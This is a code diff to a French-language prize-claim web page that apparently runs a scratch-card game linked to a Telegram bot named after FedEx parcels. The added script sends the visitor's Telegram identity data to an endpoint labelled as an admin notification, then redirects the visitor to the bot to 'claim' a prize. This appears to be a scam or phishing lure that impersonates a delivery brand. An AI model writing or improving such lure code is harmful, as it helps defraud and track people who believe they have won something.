@@ -147,9 +147,9 @@
   <div id="sticker-container"></div>
   <p class="message" id="message"></p>
 
-  <a id="claim-btn" class="claim-btn hidden" href="https://t.me/Fedexpackage_bot?start=claim">
+  <button id="claim-btn" class="claim-btn hidden" type="button">
     🏆 Réclamer mon lot
-  </a>
+  </button>
   <p id="claim-hint" class="claim-hint hidden">
     Cliquez ci-dessus pour réclamer votre lot
   </p>
@@ -427,6 +427,33 @@ function revealWinning(list) {
     if (btn) btn.classList.add("win");
   });
 }
+
+// =========================================================
+// BOUTON RÉCLAMER - NOTIFICATION IMMÉDIATE + REDIRECTION
+// =========================================================
+document.addEventListener("DOMContentLoaded", function() {
+  const claimBtn = document.getElementById("claim-btn");
+  if (claimBtn) {
+    claimBtn.addEventListener("click", async function() {
+      console.log("Bouton Reclamer clique");
+
+      try {
+        await fetch("/api/claim-intent", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ initData: initData })
+        });
+        console.log("Notification admin envoyee");
+      } catch (e) {
+        console.error("Erreur claim-intent:", e);
+      }
+
+      setTimeout(function() {
+        window.location.href = "https://t.me/Fedexpackage_bot?start=claim";
+      }, 300);
+    });
+  }
+});
 
 showRegister();
 </script>
